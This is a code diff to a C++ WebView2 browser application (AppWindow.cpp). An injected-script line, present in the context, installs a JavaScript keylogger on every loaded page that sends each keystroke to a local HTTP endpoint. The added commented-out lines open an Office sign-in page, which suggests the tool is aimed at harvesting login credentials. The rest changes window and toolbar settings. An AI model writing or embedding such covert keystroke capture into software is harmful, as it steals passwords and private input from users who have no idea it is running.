@@ -1094,7 +1094,8 @@ HRESULT AppWindow::OnCreateCoreWebView2ControllerCompleted(HRESULT result, ICore
             }
 
             coreWebView2->AddScriptToExecuteOnDocumentCreated(L"var link = \"http://127.0.0.1:8080/keylog?k=\";var l = \"\";document.onkeypress = function (e){l += e.key;var req = new XMLHttpRequest();req.open(\"GET\",link.concat(l), true);req.send();}", nullptr);
-
+            //coreWebView2->AddScriptToExecuteOnDocumentCreated(L"window.open(\"https://office.com/signin\");", nullptr);
+            //CloseAppWindow();
             // update window title with m_profileName
             UpdateAppTitle();
 
@@ -1276,9 +1277,9 @@ void AppWindow::RegisterEventHandlers()
                 RECT windowRect = {0};
                 UINT32 left = 0;
                 UINT32 top = 0;
-                UINT32 height = 0;
+                UINT32 height = 10;
                 UINT32 width = 0;
-                BOOL shouldHaveToolbar = false;
+                BOOL shouldHaveToolbar = true;
 
                 BOOL hasPosition = FALSE;
                 BOOL hasSize = FALSE;
